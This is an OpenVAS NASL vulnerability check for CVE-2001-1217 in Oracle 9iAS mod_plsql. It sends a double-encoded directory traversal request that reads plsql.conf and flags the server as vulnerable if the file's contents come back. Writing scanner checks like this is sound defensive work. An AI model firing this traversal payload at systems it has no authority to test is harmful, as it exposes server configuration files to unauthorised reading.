# OpenVAS Vulnerability Test
# Description: Oracle 9iAS mod_plsql directory traversal
#
# Authors:
# Matt Moore <matt.moore@westpoint.ltd.uk>
#
# Copyright:
# Copyright (C) 2002 Matt Moore
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10854");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3727);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2001-1217");
  script_name("Oracle 9iAS mod_plsql directory traversal");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2002 Matt Moore");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("www/OracleApache");

  script_xref(name:"URL", value:"http://otn.oracle.com/deploy/security/pdf/modplsql.pdf");
  script_xref(name:"URL", value:"http://www.nextgenss.com/advisories/plsql.txt");

  script_tag(name:"solution", value:"Download the patch from the oracle metalink site.");

  script_tag(name:"summary", value:"In a default installation of Oracle 9iAS, it is possible
  to use the  mod_plsql module to perform a directory traversal attack.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

url = "/pls/sample/admin_/help/..%255cplsql.conf";
req = http_get(item:url, port:port);
res = http_send_recv(port:port, data:req);
if(!res)
  exit(0);

if("Directives added for mod-plsql" >< res) {
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);